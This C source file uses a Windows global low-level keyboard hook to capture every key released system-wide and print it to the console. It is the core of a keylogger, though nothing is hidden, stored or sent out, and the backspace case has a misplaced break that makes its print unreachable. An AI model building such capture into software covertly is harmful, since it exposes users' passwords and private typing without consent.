#include <stdio.h>
#include <windows.h>

LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam)
{
	if (nCode < 0) {
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
	if( wParam != WM_KEYUP) {
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}
	switch (pKey->vkCode) {
		case VK_ESCAPE:
			printf("[ESCAPE]");
			break;
		case VK_SHIFT:
			printf("[SHIFT]");
			break;
		case VK_CONTROL:
			printf("[CONTROL]");
			break;

		case VK_DELETE:
			printf("[DELETE]");
			break;
		case VK_BACK:
			break;
			printf("[BACKSPACE]");
		case VK_SPACE:
			printf("[SPACE]");
			break;
		case VK_TAB:
			printf("[TAB]");
			break;
		case VK_CAPITAL:
			printf("[CAPS LOCK]");
			break;
		case VK_LSHIFT:
			printf("[LEFT SHIFT]");
			break;
		case VK_RSHIFT:
			printf("[RIGHT SHIFT]");
			break;
		case VK_RETURN:
			printf("[ENTER]");
			break;
		default:
			if (pKey->vkCode >= 'A' && pKey->vkCode <= 'Z') {
				printf("[%c]", pKey->vkCode);
				break;
			} else if (pKey->vkCode >= '0' && pKey->vkCode <= '9') {
				printf("[%c]", pKey->vkCode);
				break;
			} else if (pKey->vkCode >= VK_F1 && pKey->vkCode <= VK_F12) {
				printf("[F%d]", pKey->vkCode - VK_F1 + 1);
				break;
			}
	}
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(int argc, char* argv[]) {
	if (!SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0)) {
		printf("Failed to set hook: %d\n", GetLastError());
		return 1;
	}
	
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}